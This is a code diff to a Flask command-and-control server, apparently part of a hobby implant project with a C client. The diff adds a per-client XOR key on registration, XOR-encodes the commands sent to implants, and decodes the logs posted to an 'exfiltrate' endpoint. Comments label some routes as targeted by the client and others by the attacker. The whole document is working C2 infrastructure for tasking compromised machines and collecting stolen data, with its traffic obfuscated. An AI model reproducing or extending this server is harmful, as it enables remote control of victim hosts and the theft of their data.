@@ -1,19 +1,20 @@
 
-from flask import Flask, request
+from flask import Flask, request, Response
 import time
+import os
 
 
 app = Flask(__name__)
 
-# global constants
-PLAIN_TEXT = {'Content-Type': 'text/plain'}
+PLAIN_TEXT = {'Content-Type': 'text/plain'} 
 MAX_ACTIVE_TIME_BETWEEN_BEACON = 45
 
 class Cli():
-    def __init__(self, id: str, os: str, arch: str, time_s: str):
+    def __init__(self, id: str, os: str, arch: str, time_s: str, enc_key: bytes):
         self.id = id; 
-        self.os = os
+        self.os_ = os
         self.arch = arch
+        self.enc_key = enc_key
         self.commands, self.logs = [], []
         self.last_beacon = float(time_s)  # stores as a timestamp
         self.beacon_diff = self.get_time_since_beacon()
@@ -47,13 +48,15 @@ clients: dict[str, Cli] = {}
 @app.route('/register', methods=['GET'])
 def register():
     id = request.args.get('id')
-    os = request.args.get('os')
+    os_ = request.args.get('os')
     arch = request.args.get('arch')
     time_s = request.args.get('time')
-    client = Cli(id, os, arch, time_s)
+    enc_key = os.urandom(1)  # random single byte key and make sure its unsigned!
 
-    clients[id] = client
-    return 'OK', 200, PLAIN_TEXT
+    print(f'\n\nKEY: {enc_key.hex()}\n\n') # .hex()
+
+    clients[id] = Cli(id, os_, arch, time_s, enc_key)
+    return Response(enc_key, status=200, content_type='application/octet-stream')
 
 
 # TARGETED BY: client
@@ -65,7 +68,7 @@ def exfiltrate(cid):
         return 'UNKNOWN CLI', 400, PLAIN_TEXT
 
     log = request.get_data(as_text=False) # we want bytes not text!
-    log = decode(log)  # decode the encoded logs
+    log = decode(log, clients[cid])  # decode the encoded logs
 
     clients[cid].add_log(log)
     return 'OK', 200, PLAIN_TEXT
@@ -74,23 +77,26 @@ def exfiltrate(cid):
 # TARGETED BY: client
 @app.route('/commands', methods=['GET'])
 def get_commands():
-    # Endpoint serves as both command retrieval and beacon
-    # requests come in the form /commands?cid=<cid>&time=<timstamp>
+    '''Endpoint serves as both command retrieval and beaconing. 
+    Requests come in the form /commands?cid=<cid>&time=<timstamp>
+    '''
     cid = request.args.get('cid')
     if cid not in clients.keys():
-        return 'UNKNOWN CLI', 400, PLAIN_TEXT
+        return 'ERR', 400, PLAIN_TEXT
 
-    # update the beacon timestamp!
-    clients[cid].last_beacon = float(request.args.get('time'))
-    clients[cid].update_status()
+    # retieve client and update beacon information
+    client = clients[cid]
+    client.last_beacon = float(request.args.get('time'))
+    client.update_status()
 
     # if there are no commands to execute return nothing
-    if len(clients[cid].commands) == 0:
+    if len(client.commands) == 0:
         return '', 200, PLAIN_TEXT
+
+    encoded_commands = encode_commands(client)
+    client.commands = []  # clear command log
     
-    cmds = '\n'.join(clients[cid].commands)
-    clients[cid].commands = []  # clear command log
-    return cmds, 200, PLAIN_TEXT
+    return Response(encoded_commands, status=200, content_type='application/octet-stream')
 
 
 # TARGETED BY: attacker
@@ -129,6 +135,14 @@ def get_log(cid):
 # Encoding helper functions
 # -------------------------
 
+def encode_commands(client: Cli) -> bytes:
+    cmds_bytes = bytearray()
+    num_cmds = len(client.commands)
+    for i, cmd in enumerate(client.commands):
+        cmds_bytes.extend(encode(cmd, client))
+        if i < num_cmds - 1:
+            cmds_bytes.append(0x0A) # add a newline character
+    return bytes(cmds_bytes)
 
 def rotate_right(ch):
     ''' This performs the same operation as in my c code 
@@ -137,17 +151,17 @@ def rotate_right(ch):
     '''
     return ((ch >> 1) | (ch << (8 - 1))) & 0xFF
 
-def encode(msg: str) -> str:
+def encode(msg: str, cli: Cli) -> bytes:
     ' Encode the message '
-    return asym_xor(msg.encode('utf-8'))
+    return asym_xor(msg.encode('utf-8'), cli)
 
-def decode(msg: bytes) -> str:
+def decode(msg: bytes, cli: Cli) -> str:
     ' Decodes and encoded message '
-    return asym_xor(msg).decode('utf-8')
+    return asym_xor(msg, cli).decode('utf-8')
 
-def asym_xor(s: bytes):
+def asym_xor(s: bytes, cli: Cli) -> bytes:
     ' symetric encoding helper function '
-    key = 0x2E
+    key = cli.enc_key[0]
     result = bytearray()
 
     for byte in s:
